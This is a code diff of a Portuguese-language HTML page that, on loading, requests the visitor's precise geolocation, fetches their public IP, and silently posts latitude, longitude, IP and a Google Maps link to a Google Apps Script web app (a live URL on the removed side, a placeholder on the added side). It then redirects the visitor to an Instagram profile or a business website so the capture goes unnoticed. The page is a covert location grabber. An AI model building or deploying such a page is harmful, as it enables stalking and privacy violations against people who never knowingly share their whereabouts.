@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Localizando...</title>
   <style>
     body {
@@ -18,66 +18,53 @@
     }
   </style>
   <script>
-    window.onload = function () {
+    window.onload = function() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error);
+        navigator.geolocation.getCurrentPosition(sucesso, erro);
       } else {
         document.body.innerHTML = "<p>Seu navegador não suporta geolocalização.</p>";
       }
     };
 
-    function success(position) {
+    function sucesso(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      fetch("https://api.ipify.org?format=json")
-        .then((response) => response.json())
-        .then((data) => {
+      // Captura o IP do visitante
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
           const ip = data.ip;
+
           const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-          fetch(
-            "https://script.google.com/macros/s/AKfycbxF6dN416_NHMnlCtg9lwSmBMYyzPAsspDyZId1yekWL8rqvtrrkHCHa1SiROPMCdQCQg/exec",
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                latitude: latitude,
-                longitude: longitude,
-                ip: ip,
-                maps: mapsLink,
-              }),
-            }
-          )
-            .then((response) => response.text())
-            .then((text) => {
-              console.log("Resposta do servidor:", text);
-              redirecionaInstagram();
+          // Envia os dados para sua planilha no Google Sheets
+          fetch('SEU_WEBAPP_URL_AQUI', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              latitude: latitude,
+              longitude: longitude,
+              ip: ip,
+              maps: mapsLink
             })
-            .catch((err) => {
-              console.error("Erro ao enviar dados:", err);
-              // Mesmo em caso de erro, redireciona para Instagram
-              redirecionaInstagram();
-            });
-        })
-        .catch((err) => {
-          console.error("Erro ao obter IP:", err);
-          // Se não conseguir IP, redireciona mesmo assim
+          });
+
+          // Após capturar, redireciona para o Instagram
           redirecionaInstagram();
         });
     }
 
-    function error(err) {
+    function erro(err) {
       console.warn("Geolocalização não permitida ou erro:", err);
-      document.body.innerHTML =
-        "<p>⚠️ É necessário permitir a localização para continuar.</p>";
+      document.body.innerHTML = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
     }
 
     function redirecionaInstagram() {
-      window.location.href =
-        "https://www.instagram.com/_.karinaborges?igsh=ZmRubmdya2l3ZDRm";
+      window.location.href = "https://www.despachanteespindola.com/";
     }
   </script>
 </head>
